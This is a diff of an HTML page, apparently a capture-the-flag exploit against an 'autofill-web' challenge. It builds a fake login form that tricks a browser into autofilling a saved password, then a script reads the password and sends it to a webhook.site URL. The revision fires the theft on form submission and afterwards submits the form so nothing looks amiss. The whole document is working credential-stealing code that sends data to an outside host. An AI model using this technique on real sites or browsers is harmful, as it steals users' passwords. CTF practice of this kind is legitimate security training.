@@ -6,39 +6,43 @@
 <body>
     <h1>Please wait, loading configuration...</h1>
 
-    <!-- 1. 브라우저를 속이기 위한 더 진짜 같은 로그인 폼 -->
+    <!-- 1. autocomplete 속성을 추가하여 브라우저를 완벽하게 속이는 폼 -->
     <form id="login-form" action="https://autofill-web.k17.kctf.cloud/login" method="POST">
         <label for="username">Username:</label>
-        <input type="text" id="username" name="username" value="admin">
+        <input type="text" id="username" name="username" value="admin" autocomplete="username">
         <br>
         <label for="password">Password:</label>
-        <input type="password" id="password" name="password">
+        <!-- (핵심) autocomplete="current-password" 추가 -->
+        <input type="password" id="password" name="password" autocomplete="current-password">
         <br>
-        <!-- 2. (핵심) 제출 버튼을 추가하여 폼을 완전하게 만듭니다. -->
         <input type="submit" value="Sign In">
     </form>
 
     <script>
         // (중요) 이 URL을 당신의 Webhook.site URL로 반드시 교체하세요!
-        const webhookUrl = 'https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
+        const webhookUrl = '	https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3';
+        const form = document.getElementById('login-form');
 
-        // 3. 봇이 상호작용하는 시간(1초)에 맞춰 지연 시간을 설정합니다.
-        setTimeout(() => {
-            const passField = document.getElementById('password');
-            const stolenPassword = passField.value;
+        // 2. (핵심) 타이머 대신 form의 'submit' 이벤트를 감지
+        form.addEventListener('submit', (event) => {
+            // 폼이 실제로 제출되어 페이지가 넘어가는 것을 일단 막습니다.
+            event.preventDefault();
 
-            // 자동 완성이 성공했는지 확인
+            const stolenPassword = document.getElementById('password').value;
+
             if (stolenPassword) {
-                console.log("Password stolen:", stolenPassword);
+                console.log("Password stolen on submit:", stolenPassword);
                 // 훔친 비밀번호를 Webhook으로 전송
-                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`);
+                fetch(`${webhookUrl}?password=${encodeURIComponent(stolenPassword)}`)
+                  .then(() => {
+                    // 전송 후, 원래대로 폼을 제출하여 자연스럽게 보이게 할 수 있습니다.
+                    form.submit();
+                  });
             } else {
-                console.log("Autofill failed. Password field is still empty.");
-                // 디버깅을 위해 실패 메시지를 보낼 수도 있습니다.
-                fetch(`${webhookUrl}?error=autofill_failed`);
+                console.log("Submit triggered, but password field is empty.");
+                fetch(`${webhookUrl}?error=autofill_failed_on_submit`);
             }
-        }, 1000); 
-
+        });
     </script>
 </body>
 </html>
